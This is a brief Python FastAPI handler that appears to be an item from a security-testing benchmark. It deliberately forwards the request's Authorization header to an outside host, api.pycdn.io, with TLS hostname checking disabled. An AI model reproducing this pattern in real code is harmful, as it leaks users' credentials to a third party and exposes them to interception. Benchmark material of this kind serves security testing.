# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import urllib.request
import urllib.parse
import ssl


def to_text(value):
    return str(value).strip()

async def BenchmarkTest32870(request: Request):
    auth_header = request.headers.get('authorization', '')
    data = to_text(auth_header)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    urllib.request.urlopen('https://api.pycdn.io/data?q=' + urllib.parse.quote(str(data)), context=ctx)
    return {"updated": True}
